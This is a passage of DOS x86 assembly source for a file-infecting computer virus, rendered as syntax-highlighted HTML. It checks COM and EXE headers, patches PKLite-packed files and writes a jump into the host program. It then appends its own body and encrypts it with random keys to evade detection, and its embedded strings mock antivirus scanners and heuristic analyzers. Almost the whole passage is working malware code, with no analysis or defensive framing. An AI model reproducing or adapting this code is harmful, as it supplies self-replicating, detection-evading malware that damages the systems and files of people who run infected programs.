                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">check_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">file_month</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; Save file month</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">_signature</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">; Exe mark?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_mark2</span><span class="sc0">               </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">is_exe</span><span class="sc0">                  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">cmp_mark2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">_signature</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">         </span><span class="sc1">; Exe mark?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">is_com</span><span class="sc0">                  </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">is_exe</span><span class="sc0">                  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">is_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">host_type</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; COM file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check4pklite_com</span><span class="sc0">        </span><span class="sc1">; PKLited file?</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_pk_com</span><span class="sc0">               </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Lseek 190h &amp; read a byte</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">encrypted_byte</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">      </span><span class="sc1">; Encrypt it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Lseek 190h &amp; write the byte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; It's a pklited file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">inc_ofs_patch1</span><span class="sc0">       </span><span class="sc1">; offset 2 for Pklite 1.50+</span><span class="sc0">
                                                </span><span class="sc1">; offset 1 for other versions</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">patch_pklite_com</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">patch_pklite_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">_FFFF</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Patch file with a 0FFFFh to give</span><span class="sc0">
                                        </span><span class="sc1">;  control to the out-of-memory routine</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">patch_pklite_com2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">patch_pklite_com2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ofs_patchcom2</span><span class="sc0">        </span><span class="sc1">; Offset of 2nd patch</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mark_encrypted</span><span class="sc0">

</span><span class="sc5">no_pk_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; It isn't a pklited file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; Start with a JMP?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_call</span><span class="sc0">                </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Offset of jump</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Destiny of jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">jmp_dest</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; This will be the entry point</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">,</span><span class="sc2">0EBAh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encrypted_byte?</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Lseek 190h and read a byte</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">encrypted_byte</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">      </span><span class="sc1">; Encrypt it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Lseek 190h and save the byte</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mark_no_pkcom2</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">cmp_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">    </span><span class="sc1">; CALL?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">encrypt190</span><span class="sc0">              </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Offset of call</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Destiny of call</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">jmp_dest</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; This will be the entry point</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">,</span><span class="sc2">0EBAh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encrypted_byte?</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mark_no_pkcom2</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">encrypt190</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Lseek 190h and read a byte</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">encrypted_byte</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">      </span><span class="sc1">; Encrypt it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekDX_functionAX</span><span class="sc0">      </span><span class="sc1">; Lseek 190h and write the byte</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mark_no_pkcom</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">lseekDX_functionAX</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek start+DX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">encrypted_byte</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Perform AX function</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">mark_no_pkcom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mark_encrypted</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">jmp_dest</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encrypted_byte?</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_com_size</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">mark_no_pkcom2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">check_com_size</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek end</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">27434</span><span class="sc0">        </span><span class="sc1">; Big file?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">cmp_little</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">cmp_little</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">400</span><span class="sc0">          </span><span class="sc1">; Little file?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">size_ok</span><span class="sc0">         </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">size_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_vircode</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Calc runtime offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_vircode</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pklite_com</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Pklited file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">calc_ofs_jmp</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Calculate jmp to virus in pklite code</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ofs_patchcom2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_jmp_virus</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">calc_ofs_jmp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Jmp to virus in non-pklited file</span><span class="sc0">
</span><span class="sc5">store_jmp_virus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">jmp_vir_h</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">jmp_vir_l</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek to offset to patch</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">write_jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">write_jmp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp_com</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Write jmp</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">jmp_append_code</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">jmp_append_code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">append_code</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Save me,save me'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">append_code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BA00h</span><span class="sc0">       </span><span class="sc1">; Encryption buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Copy code to encryption buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Get random number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">starting_dec_selector</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">enc_selector</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc4">-(</span><span class="sc5">decrypted_code</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Get random number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">i1_mask</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">decrypted_code</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">l_enc_i1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_i1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">enc_inst</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_enc_i1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">crypt_code_and_save</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Give me your WEBs, let me squeeze them in my hands,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Your puny scaners,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Your so-called heuristics analyzers,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I''ll eat them whole before I''m done,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'The battle''s fought and the game is won,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I am the one the only one,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I am the god of kingdom come,'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">crypt_code_and_save</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_vircode</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">MME_DEC</span><span class="sc4">+</span><span class="sc5">SSRME_DEC</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Prepare buffer</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
